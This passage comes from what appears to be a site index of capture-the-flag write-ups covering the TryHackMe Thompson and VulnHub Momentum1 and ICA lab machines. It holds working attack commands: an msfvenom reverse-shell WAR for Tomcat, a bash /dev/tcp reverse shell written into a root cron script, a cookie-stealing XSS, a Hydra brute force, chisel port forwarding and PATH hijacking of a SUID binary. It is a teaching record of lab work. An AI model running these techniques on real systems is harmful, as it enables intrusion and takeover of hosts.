tomcat/s3cret - and they worked perfectly! I was now inside the Manager dashboard.</p> <p></p> <p>With access to the Manager interface, I explored the options and found the WAR file upload section. I knew this was my entry point since Tomcat executes uploaded JSP code.</p> <p>First, I created a malicious WAR file using msfvenom:</p> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war &gt; shell.war\n</code></pre> <p></p> <p>Next, I set up my listener in Metasploit:</p> <pre><code>msfconsole\n\n#in the msfconsole terminal\nuse multi/handler\nset PAYLOAD java/jsp_shell_reverse_tcp\nset LHOST tun0\nset LPORT 4444\nrun\n</code></pre> <p></p> <p>Note: Netcat would also work here: </p> <pre><code>rlwarp nc -lvnp 4444\n</code></pre> <p>I uploaded <code>shell.war</code> through the Manager interface, clicked Deploy, then navigated to <code>http://10.80.167.208:8080/shell/</code> to trigger the payload. Boom - shell obtained</p> <p></p> <p>My shell was unstable, so I stabilized it with these commands:</p> <pre><code># Spawn a proper TTY\npython -c 'import pty; pty.spawn(\"/bin/bash\")' \n\n# Background and stabilise it\nCTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;\n</code></pre>"},{"location":"writeups/platforms/tryhackme/easy/thompson/thompson/#user-access","title":"User Access","text":"<p>Now with a stable shell, I navigated to <code>/home</code> and found a user named <code>jack</code> and grabbed the user flag</p> <p></p>"},{"location":"writeups/platforms/tryhackme/easy/thompson/thompson/#privilege-escalation","title":"Privilege Escalation","text":"<p>LinPEAS didn't reveal much, so I manually checked for cron jobs:</p> <pre><code>cat /etc/crontab\n</code></pre> <p></p> <p>Jackpot! I found this entry:</p> <pre><code> *  * * * root  cd /home/jack &amp;&amp; bash id.sh\n</code></pre> <p>A root cronjob running every minute from the writable <code>/home/jack/</code> directory!</p> <p>I checked the script contents:</p> <pre><code>cat id.sh\nls -la id.sh\n</code></pre> <p></p> <p>The script was simple (<code>#!/bin/bash</code> and <code>id &gt; test.txt</code>), but when I saw the permissions, I realized this was the privilege escalation vector. The file was writable by my <code>tomcat user</code>, yet executed by <code>root cron</code> every single minute.</p> <p>What came to my mind was that since root was executing this file and I had write permissions, I could simply edit it and place my reverse shell payload. When root cron ran it next, I'd get a root shell callback on my listener.</p> <p>So I overwrote <code>id.sh</code> with the reverse shell:</p> <pre><code>echo \"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.145.53/4321 0&gt;&amp;1'\" &gt; id.sh\n</code></pre> <p></p> <p>Next, I started my netcat listener  and waited about a minute for the next cron execution - and sure enough, the root shell connected back!</p> <pre><code>rlwrap nc -lvnp 4321\n</code></pre> <p></p> <p>I eventually obtained the root flag</p> <p></p>"},{"location":"writeups/platforms/vulnhub/series/","title":"VulnHub \u2014 Series Machines\u00b6","text":"<p>This section contains multi\u2011part or themed VulnHub machine series. These offer progressive difficulty, deeper enumeration, and chained exploitation paths.</p>"},{"location":"writeups/platforms/vulnhub/series/#completed-series","title":"Completed Series\u00b6","text":"<ul> <li>Momentum</li> </ul> <p>Additional series entries will be added as I continue working through more VulnHub machine sets.</p>"},{"location":"writeups/platforms/vulnhub/series/momentum/momentum1/momentum1/","title":"Momentum1","text":""},{"location":"writeups/platforms/vulnhub/series/momentum/momentum1/momentum1/#initial-reconnaissance","title":"Initial Reconnaissance","text":"<p>I began by scanning the network to find the target machine\u2019s IP address:</p> <pre><code>ip neigh \n\n# Alternatively, we can use: \nsudo arp-scan -l\n</code></pre> <p></p> <p>The discovered IP address was 192.168.56.103.</p> <p>I ran an nmap scan which revealed two open ports: 22 (SSH) and 80 (HTTP).</p> <p></p>"},{"location":"writeups/platforms/vulnhub/series/momentum/momentum1/momentum1/#enumeration","title":"Enumeration","text":"<p>My first step was to visit the web page hosted on port 80.</p> <p></p> <p>I then examined the source code and ran\u00a0<code>gobuster</code>\u00a0to enumerate hidden directories.</p> <p></p> <p>The following endpoints were discovered:</p> <ul> <li><code>/index.html</code>: 200 OK</li> <li><code>/js/</code>: Contained\u00a0<code>main.js</code></li> <li><code>/css/</code>,\u00a0<code>/img/</code>,\u00a0<code>/manual/</code>: Static content</li> <li><code>/.htaccess</code>,\u00a0<code>.htpasswd</code>,\u00a0<code>/server-status</code>: Forbidden</li> </ul> <p>Navigating into\u00a0<code>/js/</code>, I found a file named main.js with the following content:</p> <p></p> <pre><code>function viewDetails(str) {\n   window.location.href = \"opus-details.php?id=\"+str; \n}\n\n/* var CryptoJS = require(\"crypto-js\"); \nvar decrypted = CryptoJS.AES.decrypt(encrypted, \"SecretPassphraseMomentum\"); console.log(decrypted.toString(CryptoJS.enc.Utf8)); \n*/\n</code></pre> <p>This revealed:</p> <ul> <li>A client-side redirection function.</li> <li>A commented-out decryption snippet with a hardcoded AES passphrase:\u00a0<code>SecretPassphraseMomentum</code>.</li> </ul> <p>The redirection function was interesting because visiting image links redirected the URL with an\u00a0<code>id</code>\u00a0parameter, for example:</p> <pre><code>http://192.168.56.103/opus-details.php?id=demon\n</code></pre> <p></p> <p>Similarly, the\u00a0<code>id</code>\u00a0changed on visiting another image, like\u00a0<code>angel</code>:</p> <pre><code>http://192.168.56.103/opus-details.php?id=angel\n</code></pre> <p></p> <p>Experimenting with the\u00a0<code>id</code>\u00a0parameter, I tested an XSS payload:</p> <pre><code>http://192.168.56.103/opus-details.php?id=&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre> <p>The payload was reflected, confirming the vulnerability.</p> <p></p> <p>I further used the payload to retrieve the cookie value:</p> <pre><code>http://192.168.56.103/opus-details.php?id=&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n</code></pre> <p></p> <p>The cookie value appeared encrypted:</p> <pre><code>cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt\n</code></pre> <p>Knowing the AES key from the commented script, I created a Node.js decryption script:</p> <pre><code>var CryptoJS = require(\"crypto-js\"); \nvar encrypted =\n\"U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt\"; \nvar decrypted = CryptoJS.AES.decrypt(encrypted, \"SecretPassphraseMomentum\"); console.log(decrypted.toString(CryptoJS.enc.Utf8));`\n</code></pre> <p>The output was:</p> <pre><code>auxerre-alienum##\n</code></pre> <p></p> <p>This appeared to be credentials or a password.</p>"},{"location":"writeups/platforms/vulnhub/series/momentum/momentum1/momentum1/#exploitation","title":"Exploitation","text":"<p>After trial and error, I successfully logged in via SSH:</p> <pre><code>ssh auxerre@192.168.56.103   \n# password: auxerre-alienum##\n</code></pre> <p>I obtained the user flag:</p> <pre><code>84157165c30ad34d18945b647ec7f647\n</code></pre> <p></p>"},{"location":"writeups/platforms/vulnhub/series/momentum/momentum1/momentum1/#initial-shell-post-exploitation","title":"Initial Shell &amp; Post-Exploitation","text":"<p>To escalate privileges, I launched\u00a0<code>linpeas</code>\u00a0for an automated system scan.</p> <pre><code># Local machine:   \npython3 -m http.server 8000 \n\n# Target machine:   \ncd /tmp   wget http://&lt;vboxnet&gt;:8000/linpeas.sh   \n# Make it executable\nchmod +x linpeas.sh\n</code></pre> <p><code>linpeas</code>\u00a0revealed a local service: Redis running on localhost only.</p> <pre><code>127.0.0.1:6379 \u2192 redis-server listening on localhost only\n</code></pre> <p></p> <p>This was confirmed by:</p> <pre><code>ps aux | grep redis   \nss -nltup | grep 6379\n</code></pre> <p>However, connecting locally to Redis produced a permission denied message.</p> <p></p>"},{"location":"writeups/platforms/vulnhub/series/momentum/momentum1/momentum1/#privilege-escalation-via-port-forwarding","title":"Privilege Escalation via Port Forwarding","text":"<p>To connect remotely, I used\u00a0<code>chisel</code>\u00a0for port forwarding.</p> <pre><code># Local machine:   \npython3 -m http.server 8000 \n\n# Target machine:   \ncd /tmp   wget http://&lt;vboxnet&gt;:8000/chisel   \n# Make it executable\nchmod +x chisel\n</code></pre> <p>On the attacker machine, I ran:</p> <pre><code>chisel server --reverse --port 5555\n</code></pre> <p></p> <p>On the target machine, I ran:</p> <pre><code>./chisel client &lt;attacker-ip&gt;:5555 R:127.0.0.1:6379\n</code></pre> <p></p> <p>This allowed remote connection to the Redis server for further exploitation.</p> <p></p>"},{"location":"writeups/platforms/vulnhub/series/momentum/momentum1/momentum1/#root-access","title":"Root Access","text":"<p>With the root password obtained, I switched to root user:</p> <pre><code>su root   \n# Password: m0mentum-al1enum##\n</code></pre> <p>Finally, I retrieved the root flag:</p> <pre><code>658ff660fdac0b079ea78238e5996e40\n</code></pre> <p></p>"},{"location":"writeups/platforms/vulnhub/single/","title":"VulnHub \u2014 Single Machines\u00b6","text":"<p>This section contains standalone VulnHub boot\u2011to\u2011root machines. Each machine focuses on a specific concept or exploit path, making them ideal for targeted practice.</p>"},{"location":"writeups/platforms/vulnhub/single/#completed-machines","title":"Completed Machines\u00b6","text":"<ul> <li>ICA</li> </ul> <p>More single machines will be added as I progress through additional VulnHub challenges.</p>"},{"location":"writeups/platforms/vulnhub/single/ica/ica/","title":"Ica","text":""},{"location":"writeups/platforms/vulnhub/single/ica/ica/#initial-reconnaissance","title":"Initial Reconnaissance","text":"<p>To begin, I scanned the network to identify the target machine's IP address:</p> <pre><code>ip neigh\n\n# Alternatively, we can use: \nsudo arp-scan -l\n</code></pre> <p></p> <p>The discovered IP address was 192.168.57.6.</p> <p>Next, I conducted an nmap scan to enumerate open ports. The scan revealed three open ports: 22 (SSH), 80 (HTTP), and 3306 (MySQL).</p> <p></p>"},{"location":"writeups/platforms/vulnhub/single/ica/ica/#enumeration","title":"Enumeration","text":"<p>Accessing the web server on port 80, I encountered a login screen. At the bottom of the login section, the CMS version was displayed as qdPM 9.2.</p> <p></p> <p>Using searchsploit, I checked for known exploits for qdPM 9.2 and found an exploit related to password exposure.</p> <p></p> <p>To review the exploit details, I extracted it with:</p> <pre><code>searchsploit -x php/webapps/50176.txt\n</code></pre> <p></p> <p>The exploit directed me to a URL where the database credentials were exposed at: <code>http://&lt;website&gt;/core/config/databases.yml</code></p> <p>Visiting this URL confirmed the presence of the database configuration file containing plaintext credentials.</p> <p></p> <p>The captured credentials were as follows:</p> <pre><code>db_username=qdpmadmin\ndb_name=qdpm   \nhost=localhost (192.168.57.6)   \nport=3306   \npassword=UcVQCMQk2STVeS6J\n</code></pre> <p>Using the obtained credentials, I connected to the MySQL database:</p> <pre><code>mysql -h 192.168.57.6 -u qdpmadmin -p   \n# Password: UcVQCMQk2STVeS6J`\n</code></pre> <p></p> <p>Listing the databases showed two unique databases: qdpm and staff.</p> <p>The qdpm database contained no relevant information, but the staff database included two tables of interest: user and login.</p> <pre><code>SHOW DATABASES;   \nUSE staff;   \nSHOW TABLES;   \nSELECT * FROM user;   \nSELECT * FROM login;\n</code></pre> <p>Examining the tables, the user table held usernames, while the login table contained base64-encoded passwords. Importantly, the passwords were not logically aligned with their users but linked via their IDs.</p> <p>To correlate passwords with users, I matched the id from the user table to the user_id in the login table.</p> <p></p> <p></p> <p>After sorting, the credentials appeared as:</p> <pre><code>smith = WDdNUWtQM1cyOWZld0hkQw==   \nlucas = c3VSSkFkR3dMcDhkeTNyRg==   \ntravis = REpjZVlyOThXMjhZN3dMZw==   \ndexter = N1p3VjRxdGc0MmNtVVhHWA==   \nmeyer = Y3FObkJXQ0J5UzJEdUpTeQ==\n</code></pre> <p>To decode the passwords, I used the base64 command:</p> <pre><code>echo \"&lt;encoded_passwd&gt;\" | base64 -d\n</code></pre> <p>Resulting in cleartext passwords:</p> <pre><code>smith = X7MQkP3W29fewHdC   \nlucas = suRJAdGwLp8dy3rF   \ntravis = DJceVy98W28Y7wLg   \ndexter = 7ZwV4qtg42cmUXGX   \nmeyer = cqNnBWCByS2DuJSy\n</code></pre>"},{"location":"writeups/platforms/vulnhub/single/ica/ica/#exploitation","title":"Exploitation","text":"<p>Given port 22 was open, I manually attempted SSH logins with the usernames and their decoded passwords. Only Travis and Dexter could successfully authenticate.</p> <p>Alternatively, I automated this process using Hydra. I saved usernames in users.txt and passwords in passwd_cracked.txt, then ran:</p> <pre><code>hydra -L users.txt -P passwd_cracked.txt ssh://192.168.57.6\n</code></pre> <p>Hydra confirmed the credentials for Travis.</p> <p></p> <p>I logged in as Travis:</p> <pre><code>ssh travis@192.168.57.6 \n# Password: DJceVy98W28Y7wLg\n</code></pre> <p></p> <p>Inside Travis' account, I found the user.txt file containing the flag:</p> <pre><code>ICA{Secret_Project}\n</code></pre> <p>Running linpeas yielded no further privilege escalation insights from this user.</p> <p>To upload linpeas:</p> <pre><code># From local machine, run a Python HTTP server:   \npython3 -m http.server 8000 \n\n# On target machine, navigate to /tmp and download linpeas:   \nwget http://&lt;vboxnet&gt;:8000/linpeas.sh   \n# Make linpeas executable:   \nchmod +x linpeas.sh\n</code></pre>"},{"location":"writeups/platforms/vulnhub/single/ica/ica/#initial-shell","title":"Initial Shell","text":"<p>Next, I logged into Dexter's account:</p> <pre><code>ssh dexter@192.168.57.6   \n# Password: 7ZwV4qtg42cmUXGX\n</code></pre> <p> Inside Dexter's home directory, I found a note referencing a potentially vulnerable executable. This became my next focus.</p> <p>Running linpeas again, I located the binary in question.</p> <p></p> <p>Attempting to run it directly resulted in a permission error.</p> <p></p>"},{"location":"writeups/platforms/vulnhub/single/ica/ica/#privilege-escalation","title":"Privilege Escalation","text":"<p>Using strings analysis on the binary:</p> <pre><code>strings get_access\n</code></pre> <p>The output revealed the binary executed the cat command to read files accessible only by root.</p> <p></p> <p>Because the binary called cat by relative path (/usr/bin/cat), I attempted a Relative Path Hijacking attack on this SUID program.</p> <p>The steps were:</p> <p>Navigate to /tmp:</p> <pre><code>cd /tmp\n</code></pre> <p>Create a file named cat:</p> <pre><code>touch cat\n</code></pre> <p>Add a command to spawn a root shell:</p> <pre><code>echo \"/bin/bash\" &gt; cat\n</code></pre> <p>Update the PATH environment variable to include /tmp first:</p> <pre><code>echo $PATH   export PATH=/tmp:$PATH\n</code></pre> <p>Confirm /tmp is first in PATH:</p> <pre><code>echo $PATH\n</code></pre> <p>Make the custom cat executable and run the vulnerable binary:</p> <pre><code>chmod +x cat   /opt/get_access\n</code></pre> <p></p> <p>The shell spawned had root privileges. Since the original cat was replaced, I used more to view the root-only file.</p> <p></p> <p>The root-only file contained the flag:</p> <pre><code>ICA{Next_Generation_Self_Renewable_Genetics}\n</code></pre> <p>To restore the PATH variable and fix the cat command functionality:</p> <pre><code>export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:$PATH\n</code></pre> <p>This corrected the issue.</p> <p></p>"}]}